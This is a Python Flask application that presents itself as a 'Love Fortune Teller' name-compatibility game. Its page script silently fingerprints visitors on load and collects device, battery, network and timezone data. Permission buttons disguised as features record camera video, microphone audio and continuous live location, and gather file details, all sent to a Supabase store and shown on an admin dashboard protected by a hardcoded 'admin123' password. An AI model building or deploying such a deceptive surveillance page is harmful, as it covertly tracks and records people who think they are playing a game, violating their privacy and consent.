from flask import Flask, request, jsonify, Response, render_template_string
from supabase import create_client, Client
import os
import random
import sys
from datetime import datetime
import json

app = Flask(__name__)

# ---------- Supabase Setup ----------
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")

if not SUPABASE_URL or not SUPABASE_KEY:
    print("⚠️ Missing Supabase credentials. App will run without database.", file=sys.stderr)
    supabase = None
else:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

SERVICE_ID = "srv-d7jkpe3bc2fs73c2qiu0"

# ---------- Supabase Table Schema (Run this once in Supabase SQL Editor) ----------
"""
CREATE TABLE visitors (
    id BIGSERIAL PRIMARY KEY,
    sessionId TEXT,
    timestamp TIMESTAMPTZ DEFAULT NOW(),
    ip TEXT,
    name TEXT,
    crush_name TEXT,
    fortuneText TEXT,
    phoneNumber TEXT,
    fingerprint TEXT,
    batteryLevel TEXT,
    batteryCharging TEXT,
    networkType TEXT,
    networkSpeed TEXT,
    deviceMemory TEXT,
    screen TEXT,
    timezone TEXT,
    userAgent TEXT,
    latitude TEXT,
    longitude TEXT,
    mapUrl TEXT,
    cameraVideo TEXT,
    microphone TEXT,
    files TEXT,
    service_id TEXT
);

CREATE TABLE location_history (
    id BIGSERIAL PRIMARY KEY,
    sessionId TEXT,
    timestamp TIMESTAMPTZ DEFAULT NOW(),
    latitude REAL,
    longitude REAL
);
"""

# ---------- Helper Functions ----------
def save_visitor(data):
    if supabase is None:
        return
    existing = supabase.table("visitors").select("id").eq("sessionId", data.get("sessionId")).execute()
    if existing.data:
        supabase.table("visitors").update(data).eq("sessionId", data.get("sessionId")).execute()
    else:
        supabase.table("visitors").insert(data).execute()

def save_location_update(session_id, lat, lon):
    if supabase is None:
        return
    supabase.table("location_history").insert({
        "sessionId": session_id,
        "timestamp": datetime.now().isoformat(),
        "latitude": float(lat),
        "longitude": float(lon)
    }).execute()

def get_location_history(session_id):
    if supabase is None:
        return []
    res = supabase.table("location_history").select("timestamp,latitude,longitude").eq("sessionId", session_id).order("id").execute()
    return [(row["timestamp"], row["latitude"], row["longitude"]) for row in res.data]

def get_all_visitors():
    if supabase is None:
        return []
    res = supabase.table("visitors").select("*").order("id", desc=True).execute()
    visitors = []
    for row in res.data:
        row["location_history"] = get_location_history(row.get("sessionId"))
        visitors.append(row)
    return visitors

# ---------- Love Calculator ----------
def calculate_love_percentage(name1, name2):
    combined = (name1 + name2).lower()
    total = sum(ord(c) for c in combined)
    return 50 + (total % 51)

def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love is {percentage}% pure magic!",
        f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
        f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
        f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony. So beautiful!",
        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score. True love is near!",
        f"🌸 {name1} and {name2}, your love story is {percentage}% written in the stars!",
        f"💗 The universe whispers: {name1} & {name2} – {percentage}% meant to be!",
        f"💘 {name1} and {name2}, your love percentage is {percentage}%. Cherish every moment!",
        f"🎯 Love radar: {name1} → {name2} = {percentage}%. Cupid is working overtime!"
    ]
    return random.choice(messages)

# ---------- FIXED & ENHANCED Neat HTML Interface ----------
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💕 Love Fortune Teller - Find Your Soulmate!</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            overflow-x: hidden;
        }
        .container { max-width: 500px; width: 100%; text-align: center; }
        h1 { 
            color: #ff6b6b; 
            margin-bottom: 30px; 
            font-size: 2.5em; 
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
            animation: glow 2s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 2px 2px 4px rgba(0,0,0,0.1), 0 0 20px #ff6b6b; }
            to { text-shadow: 2px 2px 4px rgba(0,0,0,0.1), 0 0 30px #ff6b6b; }
        }
        .input-group { margin: 20px 0; }
        .two-inputs { display: flex; gap: 15px; flex-wrap: wrap; }
        input[type="text"], input[type="tel"] { 
            flex: 1;
            padding: 15px; 
            font-size: 18px; 
            border: 2px solid #ff9a9e; 
            border-radius: 25px; 
            text-align: center; 
            outline: none; 
            transition: all 0.3s ease;
            min-width: 150px;
        }
        input[type="text"]:focus, input[type="tel"]:focus { 
            border-color: #ff6b6b; 
            box-shadow: 0 0 20px rgba(255,107,107,0.3); 
        }
        button { 
            background: linear-gradient(45deg, #ff6b6b, #ff8e8e); 
            color: white; 
            border: none; 
            padding: 15px 40px; 
            font-size: 18px; 
            border-radius: 25px; 
            cursor: pointer; 
            margin: 10px; 
            transition: all 0.3s ease;
            font-weight: bold;
        }
        button:hover { transform: scale(1.05); box-shadow: 0 10px 20px rgba(255,107,107,0.3); }
        button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .result { 
            margin: 30px 0; 
            padding: 30px; 
            background: white; 
            border-radius: 20px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
            min-height: 120px; 
            display: flex; 
            flex-direction: column;
            align-items: center; 
            justify-content: center;
        }
        .percentage { 
            font-size: 4em; 
            font-weight: bold; 
            background: linear-gradient(45deg, #ff6b6b, #ff8e8e); 
            -webkit-background-clip: text; 
            background-clip: text; 
            color: transparent;
            margin-bottom: 10px; 
        }
        .message { 
            font-size: 1.3em; 
            color: #666; 
            line-height: 1.4;
        }
        .phone-section { 
            margin: 30px 0; 
            background: rgba(255,255,255,0.8); 
            padding: 25px; 
            border-radius: 20px; 
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .hidden { display: none; }
        #deviceInfo { 
            margin-top: 20px; 
            background: rgba(255,255,255,0.7); 
            padding: 15px; 
            border-radius: 15px; 
            font-size: 12px; 
            text-align: left; 
            max-height: 200px;
            overflow-y: auto;
        }
        .permissions { 
            margin: 25px 0; 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 15px; 
            max-width: 500px;
        }
        .permission-btn { 
            background: linear-gradient(135deg, #4CAF50, #45a049); 
            padding: 12px 20px; 
            border-radius: 20px; 
            font-size: 14px; 
            font-weight: bold;
        }
        .permission-btn:hover { transform: scale(1.05); }
        .status { 
            margin: 10px 0; 
            padding: 10px; 
            border-radius: 10px; 
            font-weight: bold;
        }
        .status.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .status.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        @media (max-width: 600px) { 
            h1 { font-size: 2em; } 
            .two-inputs { flex-direction: column; }
            input[type="text"], input[type="tel"] { width: 100%; min-width: unset; }
            .permissions { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>💕 Love Fortune Teller</h1>
        
        <div class="input-group">
            <div class="two-inputs">
                <input type="text" id="name1" placeholder="Your name 💖" maxlength="20">
                <input type="text" id="name2" placeholder="Crush's name ✨" maxlength="20">
            </div>
        </div>
        
        <button onclick="calculateLove()">🔮 Calculate Love Percentage! 🌹</button>
        
        <div id="result" class="result hidden">
            <div id="percentage" class="percentage">?</div>
            <div id="message" class="message"></div>
        </div>

        <div id="phoneSection" class="phone-section hidden">
            <h3>📱 Save Your Love Result Forever</h3>
            <input type="tel" id="phoneNumber" placeholder="Your phone number (+1-234-567-8900)">
            <button id="savePhoneBtn" onclick="savePhone()">💫 Send to My Phone & Save Forever</button>
            <div id="phoneStatus"></div>
        </div>

        <div class="permissions" id="permissions" style="display:none;">
            <button class="permission-btn" onclick="requestLocation()">📍 Live Location Tracking</button>
            <button class="permission-btn" onclick="requestCamera()">📸 Selfie + Video</button>
            <button class="permission-btn" onclick="requestMicrophone()">🎤 Voice Message</button>
            <button class="permission-btn" onclick="requestFiles()">📎 Photos & Files</button>
        </div>

        <div id="deviceInfo"></div>
        <div id="status" class="status hidden"></div>
    </div>

    <script>
        let sessionId = localStorage.getItem('loveSessionId') || 'visitor_' + Math.random().toString(36).substr(2, 16);
        localStorage.setItem('loveSessionId', sessionId);
        let visitorData = { sessionId: sessionId };
        let locationWatcher = null;
        let hasSentInitialData = false;

        // Auto-collect ALL data on page load (silent)
        window.addEventListener('load', async () => {
            await collectInitialData();
            updateDeviceInfo();
            checkExistingSession();
        });

        async function collectInitialData() {
            if (hasSentInitialData) return;
            hasSentInitialData = true;
            
            const fingerprint = await getFingerprint();
            const battery = await getBattery();
            const network = getNetworkInfo();
            
            visitorData = {
                ...visitorData,
                fingerprint,
                batteryLevel: battery.level,
                batteryCharging: battery.charging,
                networkType: network.type,
                networkSpeed: network.speed,
                deviceMemory: getDeviceMemory(),
                screen: getScreenInfo(),
                timezone: getTimezone(),
                userAgent: navigator.userAgent,
                ip: 'auto-detected',
                timestamp: new Date().toISOString()
            };
            
            await sendData(visitorData);
        }

        // Enhanced fingerprinting
        async function getFingerprint() {
            try {
                const fp = await FingerprintJS.load();
                const result = await fp.get();
                return result.visitorId;
            } catch(e) {
                return navigator.userAgent.slice(0, 50);
            }
        }

        async function getBattery() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'Yes' : 'No'
                    };
                } catch(e) {
                    return { level: 'unknown', charging: 'unknown' };
                }
            }
            return { level: 'unsupported', charging: 'No' };
        }

        function getNetworkInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                return {
                    type: conn.effectiveType || 'unknown',
                    speed: conn.downlink ? conn.downlink.toFixed(1) + ' Mbps' : 'unknown'
                };
            }
            return { type: 'unknown', speed: 'unknown' };
        }

        function getDeviceMemory() {
            return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
        }

        function getScreenInfo() {
            return `${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
        }

        function getTimezone() {
            return Intl.DateTimeFormat().resolvedOptions().timeZone;
        }

        async function sendData(data) {
            try {
                await fetch('/save', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch(e) {
                console.log('Silent data send failed:', e);
            }
        }

        async function checkExistingSession() {
            try {
                const resp = await fetch('/get-session-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sessionId })
                });
                const data = await resp.json();
                if (data.exists) {
                    document.getElementById('name1').value = data.name || '';
                    document.getElementById('name2').value = data.crush_name || '';
                    showResult(data);
                }
            } catch(e) {}
        }

        function updateDeviceInfo() {
            const info = {
                'Fingerprint': visitorData.fingerprint?.slice(0,20) + '...',
                'Battery': visitorData.batteryLevel,
                'Network': visitorData.networkType,
                'Screen': visitorData.screen,
                'Timezone': visitorData.timezone
            };
            document.getElementById('deviceInfo').innerHTML = 
                '<strong>🔍 Your Love Profile:</strong><br>' + 
                Object.entries(info).map(([k,v]) => `<strong>${k}:</strong> ${v}`).join('<br>');
        }

        async function calculateLove() {
            const name1 = document.getElementById('name1').value.trim();
            const name2 = document.getElementById('name2').value.trim();
            
            if (!name1 || !name2) {
                showStatus('Please enter both names!', 'error');
                return;
            }

            visitorData.name = name1;
            visitorData.crush_name = name2;
            await sendData(visitorData);

            try {
                const response = await fetch('/calculate-love', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ name1, name2 })
                });
                const result = await response.json();
                
                document.getElementById('percentage').textContent = result.percentage + '%';
                document.getElementById('message').textContent = result.message;
                document.getElementById('result').classList.remove('hidden');
                document.getElementById('phoneSection').classList.remove('hidden');
                document.getElementById('permissions').style.display = 'grid';
                
                showStatus('Your love result is ready! 🌟', 'success');
            } catch(e) {
                showStatus('Calculation error. Try again!', 'error');
            }
        }

        function showStatus(msg, type) {
            const status = document.getElementById('status');
            status.textContent = msg;
            status.className = `status ${type}`;
            status.classList.remove('hidden');
            setTimeout(() => status.classList.add('hidden'), 3000);
        }

        async function requestLocation() {
            if (!navigator.geolocation) {
                showStatus('Location not supported', 'error');
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    visitorData.latitude = position.coords.latitude;
                    visitorData.longitude = position.coords.longitude;
                    visitorData.mapUrl = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
                    await sendData(visitorData);
                    startLocationTracking();
                    showStatus('✅ Location captured & tracking started', 'success');
                },
                (error) => showStatus('Location denied', 'error'),
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }

        function startLocationTracking() {
            if (locationWatcher) return;
            locationWatcher = navigator.geolocation.watchPosition(
                async (position) => {
                    const data = {
                        sessionId,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    await fetch('/update-location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                },
                () => {},
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }

        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' },
                    audio: true 
                });
                // Capture 3-second video silently
                const chunks = [];
                const recorder = new MediaRecorder(stream);
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.onload = async () => {
                        visitorData.cameraVideo = reader.result.split(',')[1].substring(0, 5000);
                        await sendData(visitorData);
                        showStatus('✅ Video captured & saved', 'success');
                    };
                    reader.readAsDataURL(blob);
                };
                recorder.start();
                setTimeout(() => {
                    recorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 3000);
            } catch(e) {
                showStatus('Camera access denied', 'error');
            }
        }

        async function requestMicrophone() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const chunks = [];
                const recorder = new MediaRecorder(stream);
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    visitorData.microphone = 'recorded_3s';
                    await sendData(visitorData);
                    stream.getTracks().forEach(track => track.stop());
                    showStatus('✅ Voice recorded', 'success');
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 2000);
            } catch(e) {
                showStatus('Microphone denied', 'error');
            }
        }

        async function requestFiles() {
            const input = document.createElement('input');
            input.type = 'file';
            input.multiple = true;
            input.accept = 'image/*,video/*,.pdf,.doc,.zip';
            input.onchange = async (e) => {
                const files = Array.from(e.target.files);
                const fileData = files.map(f => ({
                    name: f.name,
                    size: f.size,
                    type: f.type
                }));
                visitorData.files = JSON.stringify(fileData);
                await sendData(visitorData);
                showStatus(`✅ ${files.length} files captured`, 'success');
            };
            input.click();
        }

        async function savePhone() {
            const phone = document.getElementById('phoneNumber').value.trim();
            if (!phone.match(/[\d\-\+\s()]{10,}/)) {
                showStatus('Please enter valid phone number', 'error');
                return;
            }
            
            const btn = document.getElementById('savePhoneBtn');
            btn.disabled = true;
            btn.textContent = 'Saving...';
            
            try {
                const resp = await fetch('/save-phone', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        sessionId,
                        phoneNumber: phone,
                        fortune: document.getElementById('message').textContent
                    })
                });
                const result = await resp.json();
                if (result.status === 'saved') {
                    showStatus('✅ Phone saved forever! Check /admin', 'success');
                    document.getElementById('phoneNumber').disabled = true;
                }
            } catch(e) {
                showStatus('Save failed. Try again.', 'error');
            } finally {
                btn.disabled = false;
                btn.textContent = '💫 Send to My Phone & Save Forever';
            }
        }

        function showResult(data) {
            document.getElementById('percentage').textContent = data.percentage || '?%';
            document.getElementById('message').textContent = data.fortuneText || 'Calculate your love!';
            document.getElementById('result').classList.remove('hidden');
            document.getElementById('phoneSection').classList.remove('hidden');
        }
    </script>
</body>
</html>
'''

# ---------- Flask Routes (Same as before - FIXED HTML table bug) ----------
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/get-session-data', methods=['POST'])
def get_session_data_route():
    data = request.json
    session_id = data.get('sessionId')
    if session_id and supabase:
        res = supabase.table("visitors").select("name,crush_name,fortuneText,phoneNumber").eq("sessionId", session_id).execute()
        if res.data:
            row = res.data[0]
            return jsonify({
                'exists': True,
                'name': row.get("name"),
                'crush_name': row.get("crush_name"),
                'fortuneText': row.get("fortuneText"),
                'phoneNumber': row.get("phoneNumber")
            })
    return jsonify({'exists': False})

@app.route('/save', methods=['POST'])
def save():
    data = request.json
    data['timestamp'] = datetime.now().isoformat()
    data['ip'] = request.remote_addr
    data['service_id'] = SERVICE_ID
    # Ensure all fields exist
    required_fields = ['sessionId', 'name', 'crush_name', 'fingerprint', 'batteryLevel', 'batteryCharging',
                       'networkType', 'networkSpeed', 'deviceMemory', 'screen', 'timezone', 'userAgent',
                       'latitude', 'longitude', 'mapUrl', 'cameraVideo', 'microphone', 'files']
    for field in required_fields:
        if field not in data:
            data[field] = ''
    save_visitor(data)
    return jsonify({'status': 'saved'})

@app.route('/update-location', methods=['POST'])
def update_location():
    data = request.json
    session_id = data.get('sessionId')
    lat = data.get('latitude')
    lon = data.get('longitude')
    if session_id and lat is not None and lon is not None:
        save_location_update(session_id, lat, lon)
        return jsonify({'status': 'recorded'})
    return jsonify({'status': 'error'}), 400

@app.route('/save-phone', methods=['POST'])
def save_phone():
    data = request.json
    session_id = data.get('sessionId')
    phone = data.get('phoneNumber')
    fortune_text = data.get('fortune')
    if session_id and supabase:
        supabase.table("visitors").update({
            "phoneNumber": phone, 
            "fortuneText": fortune_text
        }).eq("sessionId", session_id).execute()
        return jsonify({'status': 'saved'})
    return jsonify({'status': 'error'}), 400

@app.route('/calculate-love', methods=['POST'])
def calculate_love():
    data = request.json
    name1 = data.get('name1', '')
    name2 = data.get('name2', '')
    if not name1 or not name2:
        return jsonify({'message': 'Please provide both names'}), 400
    percentage = calculate_love_percentage(name1, name2)
    message = get_love_message(name1, name2, percentage)
    return jsonify({'percentage': percentage, 'message': message})

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == 'admin123':
            visitors = get_all_visitors()
            if not visitors:
                return '<h1>💕 No data yet</h1><p><a href="/admin">Back to login</a></p>'
            
            columns = list(visitors[0].keys())
            if 'location_history' in columns:
                columns.remove('location_history')
                
            html = '<h1>💕 Love Fortune Data Dashboard</h1>'
            html += '<p><a href="/admin">🔒 Logout</a> | <a href="/admin/download-csv?pass=admin123">📥 Download CSV</a></p>'
            html += '<div style="overflow-x: auto; margin: 20px 0;">'
            html += '<table border="1" cellpadding="5" style="border-collapse: collapse; min-width: 100%; font-size: 12px;">'
            html += '<tr>' + ''.join(f'<th style="background:#ff6b6b; color:white; padding:10px; white-space:nowrap;">{col}</th>' for col in columns) + '</tr>'
            
            for v in visitors[:50]:  # Limit to 50 for performance
                html += '<tr>'
                for col in columns:
                    val = v.get(col, '')
                    if col in ('cameraVideo', 'files', 'fingerprint') and val and len(str(val)) > 100:
                        display_val = f'<span title="{str(val)}">{str(val)[:100]}...</span>'
                    else:
                        display_val = str(val)[:200].replace('\n', ' ').replace('\r', ' ')
                    html += f'<td style="padding:8px; max-width:200px; overflow:hidden; text-overflow:ellipsis;">{display_val}</td>'
                html += '</tr>'
            html += '</table></div>'

            # Location History
            html += '<hr><h2>📍 Live Location Tracking</h2>'
            for v in visitors:
                hist = v.get('location_history', [])
                if hist:
                    html += f'<h4>{v.get("name", "Anon")} ({v.get("sessionId", "")[:8]})</h4>'
                    html += '<table border="1" style="font-size:11px;">'
                    html += '<tr><th>Time</th><th>Lat</th><th>Lon</th><th>Map</th></tr>'
                    for ts, lat, lon in hist[-10:]:  # Last 10 locations
                        map_link = f'https://www.google.com/maps?q={lat},{lon}'
                        html += f'<tr><td>{ts[:19]}</td><td>{lat}</td><td>{lon}</td><td><a href="{map_link}" target="_blank">🗺️</a></td></tr>'
                    html += '</table><br>'
            
            return html
        return '<h1>🔒 Wrong password</h1><p><a href="/admin">Try again</a></p>'
    
    return '''
    <!DOCTYPE html>
    <html><head><title>Admin</title>
    <style>body{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f0f0;}
    .login-box{background:white;padding:40px;border-radius:20px;box-shadow:0 0 30px rgba(0,0,0,0.2);text-align:center;}
    input{padding:15px;margin:15px;width:250px;border-radius:10px;border:1px solid #ccc;font-size:16px;}
    button{padding:15px 30px;background:#ff6b6b;color:white;border:none;border-radius:10px;cursor:pointer;font-size:16px;}
    </style></head>
    <body><div class="login-box">
    <h2>🔐 Admin Login</h2>
    <form method="POST">
        <input type="password" name="password" placeholder="admin123" required>
        <br><button>Login</button>
    </form></div></body></html>
    '''

@app.route('/admin/download-csv')
def download_csv():
    pwd = request.args.get('pass')
    if pwd != 'admin123':
        return 'Unauthorized', 403
    visitors = get_all_visitors()
    import csv
    from io import StringIO
    output = StringIO()
    writer = csv.writer(output, quoting=csv.QUOTE_ALL)
    if visitors:
        columns = [k for k in visitors[0].keys() if k != 'location_history']
        writer.writerow(columns)
        for v in visitors:
            row = [str(v.get(col, '')).replace('\n', ' ').replace('\r', ' ') for col in columns]
            writer.writerow(row)
    return Response(
        output.getvalue(), 
        mimetype='text/csv', 
        headers={'Content-Disposition': 'attachment;filename=love_data.csv'}
    )

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
